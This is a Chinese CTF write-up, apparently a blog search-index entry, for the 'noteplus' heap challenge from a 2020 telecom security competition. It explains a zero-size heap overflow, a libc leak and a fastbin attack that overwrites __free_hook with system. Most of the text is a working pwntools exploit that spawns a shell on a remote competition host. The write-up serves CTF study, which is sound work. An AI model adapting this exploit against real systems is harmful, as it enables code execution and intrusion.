<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>2020全国电信和互联网行业网络安全管理职业技能竞赛pwn-WP</title>
      <link href="1970/01/01/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/"/>
      <url>1970/01/01/2020%E5%85%A8%E5%9B%BD%E7%94%B5%E4%BF%A1%E5%92%8C%E4%BA%92%E8%81%94%E7%BD%91%E8%A1%8C%E4%B8%9A%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%81%8C%E4%B8%9A%E6%8A%80%E8%83%BD%E7%AB%9E%E8%B5%9Bpwn-WP/</url>
      
        <content type="html"><![CDATA[<h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><p>自己只做了pwn2，就从pwn2开始</p><p>c++用于输入输出,主要逻辑是用c实现的。因为会调用c++的库，这里涉及到一些库的库的加载。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836235597.png" alt="add"></p><p>当进行add的时候如果size为0将会成功申请空间</p><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836644128.png" alt="edit"></p><p>在edit的时候如果size为0可以无限制的获取输入，造成了堆溢出。</p><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ul><li>1.libc2.27需要填满tcach然后泄露libc地址。但是这里泄露出来的libc如下图，泄露出来的是第二条线的地址，实际上需要的是第一条线的地址，实际上这几部分是同一个库，相对的偏移都是固定的。</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836598126.png" alt="加载"></p><ul><li>2.用fastbin attack劫持__malloc_hook，2.27使得可以申请到任何一段空间不需要size的限制。实际上__malloc_hook劫持成one_gatget这里不行。实际用system函数劫持__free_hook</li></ul><p><img src="https://raw.githubusercontent.com/tower111/picture/main/%E5%B0%8F%E4%B9%A6%E5%8C%A0/1604836619586.png" alt="free_hook"></p><p>这里有一个问题：__free_hook看到的地址是在data区域,但是pwntools的symbols还是获取到了正确的偏移。</p><ul><li>3.保存点小技巧：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def debug(addr,PIE=True):</span><br><span class="line">  debug_str = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> PIE:</span><br><span class="line">    text_base = int(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print <span class="variable">$1</span>&#125;&#125;&#x27;&quot;</span>.format(p.pid)).readlines()[1], 16)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">      debug_str+=<span class="string">&#x27;x /10xg &#123;&#125;\n&#x27;</span>.format(hex(text_base+i))</span><br><span class="line">    gdb.attach(p,debug_str)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">      debug_str+=<span class="string">&#x27;b *&#123;&#125;\n&#x27;</span>.format(hex(text_base+i))</span><br><span class="line">    gdb.attach(p,debug_str)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以很方便调试开启了PIE的程序，把命令改掉可以换成下断点</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># _*_ coding:utf-8 _*_</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># context.terminal=[&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line">prog = <span class="string">&#x27;./noteplus&#x27;</span></span><br><span class="line"><span class="comment"># #elf = ELF(prog)</span></span><br><span class="line"><span class="comment"># # p = process(prog)#,env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line"><span class="comment"># libc = ELF(&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;)</span></span><br><span class="line"><span class="comment"># p = remote(&quot;121.36.245.213&quot;, 23333)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="built_in">local</span>=1</span><br><span class="line">from one_gadget import generate_one_gadget</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">local</span>:</span><br><span class="line">    path_to_libc = <span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    one=[0x4f3d5,0x4f432,0x10a41c]</span><br><span class="line">    p = process(prog)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one = [0x10a45c, 0x4f3c2, 0x4f365]</span><br><span class="line">    p=remote(<span class="string">&quot;121.36.245.213&quot;</span>, 23333)</span><br><span class="line">    path_to_libc=<span class="string">&quot;/media/tower/data/work/ctf/dianxin/pwn2/460f7fe9177846df879863c485e2940b/libc-2.27.so&quot;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(path_to_libc)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line">def one_gadget_list():</span><br><span class="line">    one=[]</span><br><span class="line">    <span class="keyword">for</span> offset <span class="keyword">in</span> generate_one_gadget(path_to_libc):</span><br><span class="line">        <span class="built_in">print</span>(hex(offset))</span><br><span class="line">        one.append(offset)</span><br><span class="line">    <span class="built_in">return</span> one</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># one=one_gadget_list()</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;/glibc/2.27/64/lib/ld-2.27.so&quot;, &quot;./pwn&quot;], env=&#123;&quot;LD_PRELOAD&quot;: &quot;/glibc/2.27/64/lib/libc.so.6&quot;&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process([&quot;./libc-2.27.so&quot;, &quot;./noteplus&quot;], env=&#123;&quot;LD_PRELOAD&quot;: &quot;./libc-2.27.so&quot;&#125;)</span></span><br><span class="line">def debug(addr,PIE=True):</span><br><span class="line">  debug_str = <span class="string">&quot;&quot;</span></span><br><span class="line">  <span class="keyword">if</span> PIE:</span><br><span class="line">    text_base = int(os.popen(<span class="string">&quot;pmap &#123;&#125;| awk &#x27;&#123;&#123;print <span class="variable">$1</span>&#125;&#125;&#x27;&quot;</span>.format(p.pid)).readlines()[1], 16)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">      debug_str+=<span class="string">&#x27;x /10xg &#123;&#125;\n&#x27;</span>.format(hex(text_base+i))</span><br><span class="line">    gdb.attach(p,debug_str)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> addr:</span><br><span class="line">      debug_str+=<span class="string">&#x27;b *&#123;&#125;\n&#x27;</span>.format(hex(text_base+i))</span><br><span class="line">    gdb.attach(p,debug_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def New(index,size):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;our choice: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,index)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;ize: &quot;</span>,size)</span><br><span class="line"></span><br><span class="line">def Delete(index):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;our choice: &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,index)</span><br><span class="line"></span><br><span class="line">def Edit(index,content):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;our choice: &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,index)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Content: &quot;</span>,content)</span><br><span class="line">def View(index):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;our choice: &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index: &quot;</span>,index)</span><br><span class="line"></span><br><span class="line">index=0x8</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(index):</span><br><span class="line">    New(str(i), str(0x98))</span><br><span class="line">New(str(9), str(0x98))</span><br><span class="line">New(str(0xa), str(0x98))</span><br><span class="line">New(str(0xb), str(0x98))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(index-1):</span><br><span class="line">    Delete(str(i))</span><br><span class="line"></span><br><span class="line">Delete(str(9))</span><br><span class="line">New(str(0xc), str(0x68))</span><br><span class="line">View(str(0xc))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content: &quot;</span>)</span><br><span class="line">libc_content=p.recvuntil(<span class="string">&quot;\x0a&quot;</span>,drop=True).ljust(8,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">libc.address=u64(libc_content)-0xb78-0x1b8-0x3eb000</span><br><span class="line"><span class="built_in">print</span>(hex(libc.address))</span><br><span class="line">New(str(0),str(0))</span><br><span class="line">Delete(str(0xa))</span><br><span class="line">New(str(0x1),str(0x68))</span><br><span class="line">New(str(0x2),str(0x68))</span><br><span class="line">New(str(0x3),str(0x68))</span><br><span class="line">New(str(0x4),str(0x68))</span><br><span class="line">Delete(str(1))</span><br><span class="line">Delete(str(2))</span><br><span class="line">Delete(str(3))</span><br><span class="line">Delete(str(4))</span><br><span class="line"><span class="comment"># New(str(5),str(0x68))</span></span><br><span class="line"><span class="comment"># New(str(6),str(0x68))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Delete(str(5))</span></span><br><span class="line"><span class="comment"># print(hex(libc.symbols[&quot;__malloc_hook&quot;]))</span></span><br><span class="line"><span class="comment">#0x354b78</span></span><br><span class="line">Edit(str(0),p64(0)*4+p64(0x71)+p64(libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]-8)*2+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(hex(libc.symbols[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line"><span class="comment"># debug([0x203320])</span></span><br><span class="line">New(str(1),str(0x68))</span><br><span class="line"></span><br><span class="line">New(str(2),str(0x68))</span><br><span class="line">New(str(3),str(0x68))</span><br><span class="line">New(str(4),str(0x68))</span><br><span class="line">New(str(5),str(0x68))</span><br><span class="line"><span class="comment"># print(hex(libc.sym[&quot;realloc&quot;]))</span></span><br><span class="line">Edit(str(5),p64(libc.symbols[<span class="string">&quot;system&quot;</span>])+<span class="string">&quot;\n&quot;</span>)<span class="comment">#p64(libc.symbols[&quot;__malloc_hook&quot;]-0x3eb000-8+13)+&quot;\n&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># New(str(6),str(0x68))</span></span><br><span class="line"></span><br><span class="line">Edit(str(0),<span class="string">&quot;a&quot;</span>*32+p64(0x71)+<span class="string">&quot;/bin/sh\x00\n&quot;</span>)</span><br><span class="line">debug([0x203320])</span><br><span class="line">Delete(str(4))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ctf , wp </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
